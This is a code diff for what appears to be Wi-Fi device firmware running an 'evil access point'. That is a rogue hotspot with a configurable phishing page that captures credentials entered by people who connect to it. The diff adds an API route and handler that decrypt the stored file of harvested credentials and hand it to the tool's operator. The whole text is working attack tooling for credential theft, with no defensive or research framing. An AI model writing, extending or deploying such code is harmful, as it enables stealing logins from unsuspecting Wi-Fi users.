@@ -383,6 +383,14 @@ static void hEvilStop() {
     evilap::stop();
     json(200, "{\"ok\":true}");
 }
+static void hEvilCreds() {
+    requireAuth(); if (!isAuthed()) return;
+    String txt;
+    if (!decryptFromFile("/logs/creds.enc", txt)) txt = "";  // none yet
+    server.sendHeader("Cache-Control", "no-cache");
+    server.send(200, "text/plain", txt);
+}
+
 static void hEvilStatus() {
     requireAuth(); if (!isAuthed()) return;
     auto st = evilap::stats();
@@ -708,6 +716,7 @@ bool begin() {
     server.on("/api/evilap/start", HTTP_POST, hEvilStart);
     server.on("/api/evilap/stop", HTTP_POST, hEvilStop);
     server.on("/api/evilap/status", HTTP_GET, hEvilStatus);
+    server.on("/api/evilap/creds", HTTP_GET, hEvilCreds);
     server.on("/api/evilap/html", HTTP_GET, hEvilHtmlGet);
     server.on("/api/evilap/html", HTTP_POST, hEvilHtmlSet);
     server.on("/api/msc", HTTP_GET, hMscGet);
